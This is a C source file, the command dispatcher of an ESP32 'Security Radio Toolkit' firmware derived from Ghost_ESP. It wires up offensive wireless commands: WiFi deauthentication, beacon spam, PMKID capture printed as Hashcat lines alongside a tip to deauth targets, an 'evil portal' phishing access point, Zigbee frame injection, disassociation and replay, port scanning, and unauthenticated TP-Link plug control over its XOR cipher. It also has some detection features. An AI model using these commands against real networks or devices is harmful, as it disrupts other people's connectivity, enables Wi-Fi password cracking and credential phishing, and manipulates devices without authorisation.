#include "core/commandline.h"
#include "core/utils.h"
#include "core/sdio_transport.h"
#include "core/callbacks.h"
#include "managers/wifi_manager.h"
#include "managers/ble_manager.h"
#include "managers/ieee802154_manager.h"
#include "managers/ap_manager.h"
#include "managers/gps_manager.h"
#include "managers/settings_manager.h"
#include "managers/sd_card_manager.h"
#include "managers/net_pipe.h"
#include "vendor/pcap.h"
#include "vendor/printer.h"
#include "vendor/dial_client.h"

#include "esp_log.h"
#include "esp_wifi.h"
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <dirent.h>
#include <time.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netdb.h>

static const char *TAG = "cmd";

#define OUT(fmt, ...) spook_output(fmt, ##__VA_ARGS__)

static command_t *s_cmd_head = NULL;

void command_init(void) { s_cmd_head = NULL; }

void command_register(const char *name, const char *help, command_func_t func)
{
    /* Check for duplicate */
    for (command_t *c = s_cmd_head; c; c = c->next) {
        if (strcmp(c->name, name) == 0) return;
    }
    command_t *cmd = calloc(1, sizeof(command_t));
    if (!cmd) return;
    cmd->name = strdup(name);
    cmd->help_short = help ? strdup(help) : NULL;
    cmd->function = func;
    cmd->next = s_cmd_head;
    s_cmd_head = cmd;
}

void command_unregister(const char *name)
{
    command_t *prev = NULL;
    for (command_t *c = s_cmd_head; c; prev = c, c = c->next) {
        if (strcmp(c->name, name) == 0) {
            if (prev) prev->next = c->next;
            else s_cmd_head = c->next;
            free(c->name);
            free(c->help_short);
            free(c);
            return;
        }
    }
}

command_func_t command_find(const char *name)
{
    for (command_t *c = s_cmd_head; c; c = c->next) {
        if (strcmp(c->name, name) == 0) return c->function;
    }
    return NULL;
}

int command_execute(const char *input)
{
    if (!input || !input[0]) return -1;

    char *copy = strdup(input);
    if (!copy) return -1;

    char *argv[16];
    int argc = 0;
    char *p = copy;

    while (*p && argc < 16) {
        while (isspace((unsigned char)*p)) p++;
        if (!*p) break;

        if (*p == '"' || *p == '\'') {
            char q = *p++;
            argv[argc++] = p;
            while (*p && *p != q) p++;
            if (*p) *p++ = '\0';
        } else {
            argv[argc++] = p;
            while (*p && !isspace((unsigned char)*p)) p++;
            if (*p) *p++ = '\0';
        }
    }

    if (argc == 0) { free(copy); return -1; }

    command_func_t fn = command_find(argv[0]);
    if (fn) {
        fn(argc, argv);
        free(copy);
        return 0;
    }

    OUT("Unknown command: %s (try 'help')\n", argv[0]);
    free(copy);
    return -1;
}

/* ═══════════════════════════════════════
 *  COMMAND HANDLERS
 * ═══════════════════════════════════════ */

/* ── WiFi Scan ── */
static void cmd_scanap(int argc, char **argv) {
    wifi_manager_start_scan();
    wifi_manager_print_scan_results();
}

static void cmd_scansta(int argc, char **argv) {
    OUT("Starting station scan...\n");
    wifi_manager_start_monitor_mode(wifi_stations_sniffer_callback);
}

static void cmd_stopscan(int argc, char **argv) {
    wifi_manager_stop_monitor_mode();
    pcap_file_close();
    OUT("Scan stopped.\n");
}

static void cmd_list(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "-a") == 0) {
        wifi_manager_print_scan_results();
    } else if (argc > 1 && strcmp(argv[1], "-s") == 0) {
        wifi_manager_list_stations();
    } else {
        OUT("Usage: list -a (APs) | -s (stations)\n");
    }
}

static void cmd_select(int argc, char **argv) {
    if (argc < 3 || strcmp(argv[1], "-a") != 0) {
        OUT("Usage: select -a <index>\n");
        return;
    }
    int idx = atoi(argv[2]);
    if (wifi_manager_select_ap(idx)) {
        ghost_ap_record_t *ap = wifi_manager_get_selected_ap();
        if (ap) OUT("Selected: %s [%02x:%02x:%02x:%02x:%02x:%02x] ch%d\n",
            ap->ssid, ap->bssid[0], ap->bssid[1], ap->bssid[2],
            ap->bssid[3], ap->bssid[4], ap->bssid[5], ap->channel);
    } else {
        OUT("Invalid index %d\n", idx);
    }
}

/* ── Attacks ── */
static void cmd_attack(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "-d") == 0) {
        OUT("Starting deauth attack...\n");
        wifi_manager_start_deauth();
    } else {
        OUT("Usage: attack -d (deauth)\n");
    }
}

static void cmd_stopdeauth(int argc, char **argv) {
    wifi_manager_stop_deauth();
    OUT("Deauth stopped.\n");
}

static void cmd_beaconspam(int argc, char **argv) {
    if (argc < 2) {
        OUT("Usage: beaconspam -r|-rr|-l|<SSID>\n");
        return;
    }
    wifi_manager_start_beacon_spam(argv[1], argc > 2 ? argv[2] : NULL);
}

static void cmd_stopspam(int argc, char **argv) {
    wifi_manager_stop_beacon_spam();
    OUT("Beacon spam stopped.\n");
}

/* ── Capture ── */
static void cmd_capture(int argc, char **argv) {
    if (argc != 2) {
        OUT("Usage: capture -probe|-beacon|-deauth|-raw|-eapol|-pmkid|-pwn|-wps|-ble|-skimmer|-stop\n");
        return;
    }
    const char *mode = argv[1];

    if (strcmp(mode, "-stop") == 0) {
        wifi_manager_stop_monitor_mode();
#ifndef CONFIG_IDF_TARGET_ESP32S2
        ble_stop();
        ble_stop_skimmer_detection();
#endif
        pcap_file_close();
        OUT("Capture stopped.\n");
        return;
    }

    struct { const char *flag; const char *name; void (*cb)(void *, wifi_promiscuous_pkt_type_t); } wifi_modes[] = {
        { "-probe",  "probescan",  wifi_probe_scan_callback },
        { "-beacon", "beaconscan", wifi_beacon_scan_callback },
        { "-deauth", "deauthscan", wifi_deauth_scan_callback },
        { "-raw",    "rawscan",    wifi_raw_scan_callback },
        { "-eapol",  "eapolscan",  wifi_eapol_scan_callback },
        { "-pwn",    "pwnscan",    wifi_pwn_scan_callback },
        { "-wps",    "wpsscan",    wifi_wps_detection_callback },
        { NULL, NULL, NULL }
    };

    for (int i = 0; wifi_modes[i].flag; i++) {
        if (strcmp(mode, wifi_modes[i].flag) == 0) {
            if (strcmp(mode, "-wps") == 0) should_store_wps = 0;
            int err = pcap_file_open(wifi_modes[i].name, PCAP_CAPTURE_WIFI);
            if (err != ESP_OK) { OUT("Error: pcap open failed\n"); return; }
            wifi_manager_start_monitor_mode(wifi_modes[i].cb);
            OUT("Started %s capture\n", wifi_modes[i].name);
            return;
        }
    }

    /* PMKID capture — needs both MGMT (beacons for SSID cache) and DATA (EAPOL) */
    if (strcmp(mode, "-pmkid") == 0) {
        g_pmkid_count = 0;
        int err = pcap_file_open("pmkid_capture", PCAP_CAPTURE_WIFI);
        if (err != ESP_OK) OUT("Warning: PCAP open failed, continuing without file\n");
        wifi_manager_start_monitor_mode(wifi_pmkid_scan_callback);
        OUT("PMKID capture started. Waiting for WPA2 handshake Message 1...\n");
        OUT("Tip: Use 'attack -d' on a target AP to force re-authentication.\n");
        return;
    }

#ifndef CONFIG_IDF_TARGET_ESP32S2
    if (strcmp(mode, "-ble") == 0) {
        OUT("Starting BLE capture...\n");
        ble_start_capture();
        return;
    }
    if (strcmp(mode, "-skimmer") == 0) {
        int err = pcap_file_open("skimmer_scan", PCAP_CAPTURE_BLUETOOTH);
        if (err != ESP_OK) OUT("Warning: PCAP open failed\n");
        ble_start_skimmer_detection();
        OUT("Skimmer detection started.\n");
        return;
    }
#endif
    OUT("Unknown capture mode: %s\n", mode);
}

/* ── BLE ── */
#ifndef CONFIG_IDF_TARGET_ESP32S2
static void cmd_blescan(int argc, char **argv) {
    if (argc < 2) { OUT("Usage: blescan -f|-ds|-a|-r|-s\n"); return; }

    if (strcmp(argv[1], "-f") == 0) { OUT("Find the Flippers...\n"); ble_start_find_flippers(); }
    else if (strcmp(argv[1], "-ds") == 0) { OUT("BLE spam detector...\n"); ble_start_blespam_detector(); }
    else if (strcmp(argv[1], "-a") == 0) { OUT("AirTag scanner...\n"); ble_start_airtag_scanner(); }
    else if (strcmp(argv[1], "-r") == 0) { OUT("Raw BLE scan...\n"); ble_start_raw_ble_packetscan(); }
    else if (strcmp(argv[1], "-s") == 0) { OUT("Stopping BLE...\n"); ble_stop(); }
    else OUT("Invalid: %s\n", argv[1]);
}

static void cmd_blewardriving(int argc, char **argv) {
    bool stop = (argc > 1 && strcmp(argv[1], "-s") == 0);
    if (stop) {
        ble_stop();
        gps_manager_deinit(&g_gps_manager);
        if (buffer_offset > 0) csv_flush_buffer_to_file();
        csv_file_close();
        OUT("BLE wardriving stopped.\n");
    } else {
        if (!g_gps_manager.initialized) gps_manager_init(&g_gps_manager);
        csv_file_open("ble_wardriving");
        ble_register_handler(ble_wardriving_callback);
        ble_start_scanning();
        OUT("BLE wardriving started.\n");
    }
}
#endif

/* ── 802.15.4 / Zigbee ── */
static int hex_to_bytes(const char *hex, uint8_t *out, size_t max_len) {
    size_t hex_len = strlen(hex);
    if (hex_len % 2 != 0) return -1;
    size_t byte_len = hex_len / 2;
    if (byte_len > max_len) return -1;
    for (size_t i = 0; i < byte_len; i++) {
        char h[3] = { hex[i*2], hex[i*2+1], 0 };
        char *end;
        long val = strtol(h, &end, 16);
        if (*end != '\0') return -1;
        out[i] = (uint8_t)val;
    }
    return (int)byte_len;
}

static void cmd_zigbee(int argc, char **argv) {
    if (argc < 2) {
        OUT("Usage: zigbee scan|stop|energy|capture|results\n");
        OUT("       zigbee inject <channel> <hex_frame>\n");
        OUT("       zigbee beacon [channel]     (send beacon request)\n");
        OUT("       zigbee disassoc <pan> <addr> <channel> [reason]\n");
        OUT("       zigbee replay <hex_frame>   (replay captured frame)\n");
        return;
    }
    if (strcmp(argv[1], "scan") == 0) {
        ieee802154_manager_init();
        ieee802154_start_scan();
        OUT("802.15.4 scan started.\n");
    } else if (strcmp(argv[1], "stop") == 0) {
        ieee802154_stop_scan();
        OUT("802.15.4 scan stopped.\n");
    } else if (strcmp(argv[1], "energy") == 0) {
        ieee802154_manager_init();
        ieee802154_start_energy_detect();
        OUT("802.15.4 energy detect started.\n");
    } else if (strcmp(argv[1], "capture") == 0) {
        ieee802154_manager_init();
        pcap_file_open("zigbee_capture", PCAP_CAPTURE_802154);
        ieee802154_start_raw_capture();
        OUT("802.15.4 raw capture started.\n");
    } else if (strcmp(argv[1], "results") == 0) {
        ieee802154_print_scan_results();
    } else if (strcmp(argv[1], "inject") == 0) {
        if (argc < 4) { OUT("Usage: zigbee inject <channel 11-26> <hex_frame>\n"); return; }
        uint8_t ch = (uint8_t)atoi(argv[2]);
        if (ch < 11 || ch > 26) { OUT("Channel must be 11-26\n"); return; }
        uint8_t frame[125];
        int len = hex_to_bytes(argv[3], frame, sizeof(frame));
        if (len < 3) { OUT("Invalid hex frame (min 3 bytes for FC+Seq)\n"); return; }
        ieee802154_manager_init();
        esp_err_t ret = ieee802154_inject_frame(frame, len, ch);
        if (ret == ESP_OK) OUT("802.15.4 frame injected (%d bytes on ch %d)\n", len, ch);
        else OUT("Injection failed: %s\n", esp_err_to_name(ret));
    } else if (strcmp(argv[1], "beacon") == 0) {
        uint8_t ch = 0; /* 0 = all channels */
        if (argc >= 3) ch = (uint8_t)atoi(argv[2]);
        ieee802154_manager_init();
        ieee802154_send_beacon_request(ch);
        if (ch == 0) OUT("Beacon requests sent on all channels.\n");
        else OUT("Beacon request sent on ch %d.\n", ch);
    } else if (strcmp(argv[1], "disassoc") == 0) {
        if (argc < 5) { OUT("Usage: zigbee disassoc <pan_hex> <addr_hex> <channel> [reason]\n"); return; }
        uint16_t pan = (uint16_t)strtol(argv[2], NULL, 16);
        uint16_t addr = (uint16_t)strtol(argv[3], NULL, 16);
        uint8_t ch = (uint8_t)atoi(argv[4]);
        uint8_t reason = (argc >= 6) ? (uint8_t)atoi(argv[5]) : 1;
        ieee802154_manager_init();
        ieee802154_send_disassoc(pan, addr, ch, reason);
    } else if (strcmp(argv[1], "replay") == 0) {
        if (argc < 3) { OUT("Usage: zigbee replay <hex_frame>\n"); return; }
        uint8_t frame[125];
        int len = hex_to_bytes(argv[2], frame, sizeof(frame));
        if (len < 3) { OUT("Invalid hex frame\n"); return; }
        ieee802154_manager_init();
        ieee802154_replay_frame(frame, len);
    } else {
        OUT("Unknown: zigbee %s\n", argv[1]);
    }
}

/* ── WiFi connection ── */
static void cmd_connect(int argc, char **argv) {
    if (argc < 3) { OUT("Usage: connect <SSID> <password>\n"); return; }
    OUT("Connecting to %s...\n", argv[1]);
    esp_err_t err = wifi_manager_connect(argv[1], argv[2]);
    if (err == ESP_OK) OUT("Connected.\n");
    else OUT("Failed: %s\n", esp_err_to_name(err));
}

/* ── Evil portal ── */
static void cmd_startportal(int argc, char **argv) {
    const char *url = settings_get_portal_url(&g_settings);
    const char *ssid = settings_get_portal_ssid(&g_settings);
    const char *pass = settings_get_portal_password(&g_settings);
    const char *ap_ssid = settings_get_portal_ap_ssid(&g_settings);
    const char *domain = settings_get_portal_domain(&g_settings);
    bool offline = settings_get_portal_offline_mode(&g_settings);

    if (argc == 6) {
        url = argv[1]; ssid = argv[2]; pass = argv[3];
        ap_ssid = argv[4]; domain = argv[5];
    } else if (argc == 4) {
        url = argv[1]; ap_ssid = argv[2]; domain = argv[3];
        offline = true;
    } else if (argc != 1) {
        OUT("Usage: startportal <URL> <SSID> <Pass> <AP_SSID> <Domain>\n");
        OUT("  or:  startportal <folder> <AP_SSID> <Domain>\n");
        OUT("  Folders are loaded from /sdcard/portals/<folder>/index.html\n");
        OUT("  Use 'portals' command to list available folders.\n");
        return;
    }

    if (!url || !url[0] || !ap_ssid || !ap_ssid[0] || !domain || !domain[0]) {
        OUT("Error: URL/file, AP_SSID, and Domain required.\n");
        return;
    }

    if (offline || !ssid || !ssid[0]) {
        wifi_manager_start_evil_portal(url, NULL, NULL, ap_ssid, domain);
    } else {
        wifi_manager_start_evil_portal(url, ssid, pass, ap_ssid, domain);
    }
    OUT("Portal started: AP=%s Domain=%s\n", ap_ssid, domain);
}

static void cmd_stopportal(int argc, char **argv) {
    wifi_manager_stop_evil_portal();
    OUT("Portal stopped.\n");
}

/* ── List available portal folders on SD card ── */
static void cmd_portals(int argc, char **argv) {
    const char *mount = sd_card_get_mount_point();
    if (!mount) {
        OUT("No SD card mounted.\n");
        return;
    }

    char portals_dir[64];
    snprintf(portals_dir, sizeof(portals_dir), "%s/portals", mount);

    DIR *dir = opendir(portals_dir);
    if (!dir) {
        OUT("No /portals directory found on SD card.\n");
        OUT("Create /sdcard/portals/<name>/index.html\n");
        return;
    }

    OUT("Available portals in %s/portals/:\n", mount);
    int count = 0;
    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_type == DT_DIR && ent->d_name[0] != '.') {
            /* Check if it has an index.html */
            char idx_path[192];
            snprintf(idx_path, sizeof(idx_path), "%s/%s/index.html", portals_dir, ent->d_name);
            FILE *f = fopen(idx_path, "r");
            bool has_index = (f != NULL);
            if (f) fclose(f);

            /* List files in folder */
            char sub_path[128];
            snprintf(sub_path, sizeof(sub_path), "%s/%s", portals_dir, ent->d_name);
            DIR *sub = opendir(sub_path);
            int file_count = 0;
            if (sub) {
                struct dirent *sf;
                while ((sf = readdir(sub)) != NULL) {
                    if (sf->d_type == DT_REG) file_count++;
                }
                closedir(sub);
            }

            OUT("  %-20s %s (%d files)\n", ent->d_name,
                has_index ? "[ready]" : "[no index.html!]", file_count);
            count++;
        }
    }
    closedir(dir);

    if (count == 0) {
        OUT("  (empty — create folders with index.html inside)\n");
    } else {
        OUT("\nUsage: startportal <folder_name> <AP_SSID> <Domain>\n");
    }
}

/* ── PMKID results ── */
static void cmd_pmkid(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "-c") == 0) {
        g_pmkid_count = 0;
        OUT("PMKID results cleared.\n");
        return;
    }

    if (g_pmkid_count == 0) {
        OUT("No PMKIDs captured yet.\n");
        OUT("Use 'capture -pmkid' to start, then 'attack -d' to force handshakes.\n");
        return;
    }

    OUT("Captured PMKIDs: %d\n\n", g_pmkid_count);
    for (int i = 0; i < g_pmkid_count; i++) {
        pmkid_result_t *r = &g_pmkid_results[i];
        if (!r->valid) continue;

        char pmkid_hex[33] = {0};
        char bssid_hex[13] = {0};
        char sta_hex[13] = {0};
        char ssid_hex[65] = {0};

        for (int j = 0; j < 16; j++) sprintf(&pmkid_hex[j*2], "%02x", r->pmkid[j]);
        for (int j = 0; j < 6; j++)  sprintf(&bssid_hex[j*2], "%02x", r->bssid[j]);
        for (int j = 0; j < 6; j++)  sprintf(&sta_hex[j*2], "%02x", r->station[j]);
        for (int j = 0; r->ssid[j] && j < 32; j++) sprintf(&ssid_hex[j*2], "%02x", (uint8_t)r->ssid[j]);

        OUT("[%d] AP: %02x:%02x:%02x:%02x:%02x:%02x (%s)\n", i,
            r->bssid[0], r->bssid[1], r->bssid[2],
            r->bssid[3], r->bssid[4], r->bssid[5], r->ssid);
        OUT("    STA: %02x:%02x:%02x:%02x:%02x:%02x\n",
            r->station[0], r->station[1], r->station[2],
            r->station[3], r->station[4], r->station[5]);
        OUT("    Hashcat (22000): %s*%s*%s*%s\n\n", pmkid_hex, bssid_hex, sta_hex, ssid_hex);
    }
}

/* ── PineAP detection ── */
static void cmd_pineap(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "-s") == 0) {
        stop_pineap_detection();
        wifi_manager_stop_monitor_mode();
        pcap_file_close();
        OUT("PineAP detection stopped.\n");
    } else {
        pcap_file_open("pineap_detection", PCAP_CAPTURE_WIFI);
        start_pineap_detection();
        wifi_manager_start_monitor_mode(wifi_pineap_detector_callback);
        OUT("Monitoring for WiFi Pineapples...\n");
    }
}

/* ── Network tools ── */
static void cmd_scanlocal(int argc, char **argv) {
    OUT("Starting local network scan...\n");
    wifi_manager_start_ip_lookup();
}

static void cmd_scanports(int argc, char **argv) {
    if (argc < 2) {
        OUT("Usage: scanports local [-C|-A|start-end]\n");
        OUT("       scanports <IP> [-C|-A|start-end]\n");
        return;
    }

    bool is_local = (strcmp(argv[1], "local") == 0);
    if (is_local) {
        if (argc < 3) { OUT("Missing port arg\n"); return; }
        wifi_manager_scan_subnet();
        return;
    }

    if (argc < 3) { OUT("Missing port arg\n"); return; }
    const char *ip = argv[1];
    const char *port_arg = argv[2];

    if (strcmp(port_arg, "-C") == 0) {
        host_result_t result = {0};
        scan_ports_on_host(ip, &result);
        for (int i = 0; i < result.num_open_ports; i++)
            OUT("  Port %d open\n", result.open_ports[i]);
    } else {
        int s = 1, e = 65535;
        if (strcmp(port_arg, "-A") != 0) {
            if (sscanf(port_arg, "%d-%d", &s, &e) != 2 || s < 1 || e > 65535) {
                OUT("Invalid port range\n"); return;
            }
        }
        scan_ip_port_range(ip, s, e);
    }
}

/* ── IoT exploitation ── */
static void tp_link_encrypt(const char *in, uint8_t *out, size_t len) {
    uint8_t key = 171;
    for (size_t i = 0; i < len; i++) { out[i] = in[i] ^ key; key = out[i]; }
}

static void tp_link_decrypt(const uint8_t *in, char *out, size_t len) {
    uint8_t key = 171;
    for (size_t i = 0; i < len; i++) { out[i] = in[i] ^ key; key = in[i]; }
}

static void cmd_tplink(int argc, char **argv) {
    if (argc != 2) { OUT("Usage: tplink on|off|loop\n"); return; }

    bool loop = (strcmp(argv[1], "loop") == 0);
    int iters = loop ? 10 : 1;

    struct sockaddr_in dest = { .sin_family = AF_INET, .sin_port = htons(9999) };
    inet_aton("255.255.255.255", &dest.sin_addr);

    for (int i = 0; i < iters; i++) {
        const char *cmd_str = (loop ? (i % 2 == 0) : (strcmp(argv[1], "on") == 0))
            ? "{\"system\":{\"set_relay_state\":{\"state\":1}}}"
            : "{\"system\":{\"set_relay_state\":{\"state\":0}}}";

        uint8_t enc[128] = {0};
        size_t cmd_len = strlen(cmd_str);
        tp_link_encrypt(cmd_str, enc, cmd_len);

        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) { OUT("Socket failed\n"); return; }

        int bcast = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &bcast, sizeof(bcast));
        sendto(sock, enc, cmd_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        OUT("Sent: %s\n", cmd_str);

        struct timeval tv = {2, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        uint8_t rbuf[128];
        socklen_t al = sizeof(dest);
        int rlen = recvfrom(sock, rbuf, sizeof(rbuf)-1, 0, (struct sockaddr *)&dest, &al);
        if (rlen > 0) {
            char dec[128];
            tp_link_decrypt(rbuf, dec, rlen);
            dec[rlen] = 0;
            OUT("Response: %s\n", dec);
        }
        close(sock);
        if (loop && i < 9) vTaskDelay(pdMS_TO_TICKS(700));
    }
}

static void cmd_dialconnect(int argc, char **argv) {
    static dial_client_t client = {0};
    dial_client_init(&client);
    dial_explore_network(&client);
}

static void cmd_printer(int argc, char **argv) {
    if (argc < 5) {
        OUT("Usage: printer <IP> <text> <fontsize> <alignment>\n");
        OUT("  alignment: CM|TL|TR|BL|BR\n");
        return;
    }
    printer_send_job(argv[1], argv[2], atoi(argv[3]), argv[4]);
}

/* ── Network Pipe ── */
static void cmd_netpipe(int argc, char **argv) {
    if (argc < 2) {
        OUT("Usage: netpipe status|close <id>|closeall\n");
        return;
    }

    if (strcmp(argv[1], "status") == 0) {
        OUT("Network pipe: %s\n", net_pipe_is_available() ? "available" : "unavailable");
        OUT("Active connections: %d/%d\n", net_pipe_active_connections(), NETPIPE_MAX_CONNECTIONS);
        OUT("WiFi connected: %s\n", wifi_manager_is_connected() ? "yes" : "no");
        if (!wifi_manager_is_connected()) {
            OUT("Run 'connect <SSID> <pass>' first for internet access.\n");
        }
    } else if (strcmp(argv[1], "close") == 0 && argc >= 3) {
        int id = atoi(argv[2]);
        OUT("Closing connection %d...\n", id);
        /* Send close via the same handler the P4 would use */
        uint8_t close_frame[sizeof(netpipe_header_t)];
        netpipe_header_t *hdr = (netpipe_header_t *)close_frame;
        hdr->op = NETPIPE_OP_CLOSE;
        hdr->conn_id = (uint8_t)id;
        hdr->flags = 0;
        net_pipe_handle_frame(close_frame, sizeof(close_frame));
    } else if (strcmp(argv[1], "closeall") == 0) {
        OUT("Closing all connections...\n");
        net_pipe_deinit();
        net_pipe_init();
        OUT("All connections closed.\n");
    } else {
        OUT("Unknown: netpipe %s\n", argv[1]);
    }
}

/* ── Wardriving ── */
static void cmd_wardrive(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "-s") == 0) {
        gps_manager_deinit(&g_gps_manager);
        wifi_manager_stop_monitor_mode();
        OUT("Wardriving stopped.\n");
    } else {
        gps_manager_init(&g_gps_manager);
        wifi_manager_start_monitor_mode(wardriving_scan_callback);
        OUT("Wardriving started.\n");
    }
}

static void cmd_gpsinfo(int argc, char **argv) {
    gps_manager_print_info(&g_gps_manager);
}

/* ── AP credentials ── */
static void cmd_apcred(int argc, char **argv) {
    if (argc >= 3) {
        strncpy(g_settings.ap_ssid, argv[1], sizeof(g_settings.ap_ssid) - 1);
        strncpy(g_settings.ap_password, argv[2], sizeof(g_settings.ap_password) - 1);
        settings_save(&g_settings);
        OUT("AP creds updated: %s\n", argv[1]);
    } else if (argc == 2 && strcmp(argv[1], "-r") == 0) {
        strcpy(g_settings.ap_ssid, "GhostNet");
        strcpy(g_settings.ap_password, "GhostNet");
        settings_save(&g_settings);
        OUT("AP creds reset to defaults.\n");
    } else {
        OUT("Usage: apcred <ssid> <password> | apcred -r\n");
    }
}

/* ── Time ── */
static void cmd_time(int argc, char **argv) {
    if (argc == 1) {
        /* Show current time */
        char ts[20];
        spook_timestamp_str(ts, sizeof(ts));
        OUT("Current time: %s\n", ts);
        if (spook_has_realtime()) {
            struct timeval tv;
            gettimeofday(&tv, NULL);
            struct tm tm;
            localtime_r(&tv.tv_sec, &tm);
            OUT("Date: %04d-%02d-%02dT%02d:%02d:%02d\n",
                tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
                tm.tm_hour, tm.tm_min, tm.tm_sec);
        } else {
            OUT("No real-time clock set. Use 'time set' or wait for GPS fix.\n");
        }
        return;
    }

    if (strcmp(argv[1], "set") == 0) {
        if (argc < 8) {
            OUT("Usage: time set <YYYY> <MM> <DD> <HH> <MM> <SS>\n");
            return;
        }
        int y = atoi(argv[2]), mo = atoi(argv[3]), d = atoi(argv[4]);
        int h = atoi(argv[5]), mi = atoi(argv[6]), s = atoi(argv[7]);
        spook_set_realtime(y, mo, d, h, mi, s);
        OUT("Real time set: %04d-%02d-%02dT%02d:%02d:%02d\n", y, mo, d, h, mi, s);
    } else {
        OUT("Usage: time | time set <YYYY> <MM> <DD> <HH> <MM> <SS>\n");
    }
}

/* ── System ── */
static void cmd_reboot(int argc, char **argv) {
    OUT("Rebooting...\n");
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_restart();
}

static void cmd_stop(int argc, char **argv) {
    wifi_manager_stop_monitor_mode();
    wifi_manager_stop_deauth();
    wifi_manager_stop_beacon_spam();
#ifndef CONFIG_IDF_TARGET_ESP32S2
    ble_stop();
    ble_stop_skimmer_detection();
#endif
    pcap_file_close();
    OUT("All operations stopped.\n");
}

static void cmd_help(int argc, char **argv) {
    OUT("\n=== SPOOK ESP — Security Radio Toolkit ===\n");
    OUT("    Built on Ghost_ESP | Off by One\n\n");
    for (command_t *c = s_cmd_head; c; c = c->next) {
        OUT("  %-16s %s\n", c->name, c->help_short ? c->help_short : "");
    }
    OUT("\n");
}

/* ═══════════════════════════════════════
 *  REGISTER ALL COMMANDS
 * ═══════════════════════════════════════ */
void command_register_all(void)
{
    /* WiFi recon */
    command_register("help",       "Show this help",                     cmd_help);
    command_register("scanap",     "Scan WiFi access points",            cmd_scanap);
    command_register("scansta",    "Scan WiFi stations",                 cmd_scansta);
    command_register("stopscan",   "Stop active scan",                   cmd_stopscan);
    command_register("list",       "List scan results (-a APs, -s STAs)",cmd_list);
    command_register("select",     "Select AP: select -a <idx>",         cmd_select);

    /* Attacks */
    command_register("attack",     "Launch attack (-d deauth)",          cmd_attack);
    command_register("stopdeauth", "Stop deauth attack",                 cmd_stopdeauth);
    command_register("beaconspam", "Beacon spam (-r/-rr/-l/<SSID>)",     cmd_beaconspam);
    command_register("stopspam",   "Stop beacon spam",                   cmd_stopspam);

    /* Capture */
    command_register("capture",    "Capture: -probe/-beacon/-deauth/-raw/-eapol/-pmkid/-pwn/-wps/-ble/-skimmer/-stop", cmd_capture);
    command_register("pmkid",      "Show captured PMKIDs [-c to clear]", cmd_pmkid);

    /* BLE */
#ifndef CONFIG_IDF_TARGET_ESP32S2
    command_register("blescan",    "BLE scan (-f/-ds/-a/-r/-s)",         cmd_blescan);
    command_register("blewardriving","BLE wardriving [-s to stop]",      cmd_blewardriving);
#endif

    /* 802.15.4 */
    command_register("zigbee",     "802.15.4: scan/stop/energy/capture/results/inject/beacon/disassoc/replay", cmd_zigbee);

    /* Portal */
    command_register("startportal","Evil portal (files from /sdcard/portals/)", cmd_startportal);
    command_register("stopportal", "Stop evil portal",                   cmd_stopportal);
    command_register("portals",    "List portal HTML files on SD card",  cmd_portals);

    /* Network */
    command_register("connect",    "Connect to WiFi: connect <SSID> <pw>",cmd_connect);
    command_register("scanlocal",  "Scan local network",                 cmd_scanlocal);
    command_register("scanports",  "Port scanner",                       cmd_scanports);
    command_register("pineap",     "PineAP detector [-s to stop]",       cmd_pineap);

    /* IoT */
    command_register("tplink",     "TP-Link plug control (on/off/loop)", cmd_tplink);
    command_register("dialconnect","DIAL cast to smart TVs",             cmd_dialconnect);
    command_register("printer",    "Print to network printer",           cmd_printer);

    /* Network pipe */
    command_register("netpipe",    "Network pipe: status|close <id>|closeall", cmd_netpipe);

    /* Wardriving / GPS */
    command_register("wardrive",   "WiFi wardriving [-s to stop]",       cmd_wardrive);
    command_register("gpsinfo",    "Show GPS info",                      cmd_gpsinfo);

    /* Settings */
    command_register("apcred",     "Set AP creds / -r to reset",         cmd_apcred);
    command_register("time",       "Show/set time: time | time set Y M D H M S", cmd_time);

    /* System */
    command_register("stop",       "Stop all operations",                cmd_stop);
    command_register("reboot",     "Reboot device",                      cmd_reboot);

    ESP_LOGI(TAG, "All commands registered");
}
